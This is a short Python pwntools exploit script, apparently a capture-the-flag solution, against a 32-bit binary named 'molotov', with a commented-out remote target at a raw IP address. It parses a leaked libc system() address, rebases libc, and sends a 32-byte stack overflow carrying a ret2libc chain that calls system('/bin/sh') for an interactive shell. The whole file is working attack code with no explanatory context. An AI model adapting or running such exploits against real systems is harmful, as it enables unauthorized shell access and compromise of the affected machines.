from pwn import *
#context_level='DEBUG'

p = process("./molotov")
#p = remote("54.210.217.206", 1240)
elf = ELF("./molotov", checksec=False)
libc = ELF("./libc6_2.30-8_i386.so")

def main():

	#EBX+0 found at offset: 24
	#EBP+0 found at offset: 28
	#EIP+0 found at offset: 32
	#Registers point to pattern buffer:
	#[ESP] --> offset 36 - size ~203

	pop_ret = p32(0x00000466) #: ret

	leak = int(p.recvline().strip("\n"), 16)
	print("Leak: " + hex(leak))

	libc.address = leak - libc.symbols['system']

	payload = ""
	payload += "A"*32
	payload += p32(libc.symbols['system'])
	payload += p32(0x0)
	payload += p32(next(libc.search("/bin/sh\x00")))

	p.recvuntil(" : \n")
	p.sendline(payload)

	p.interactive()

if __name__=="__main__":
	main()
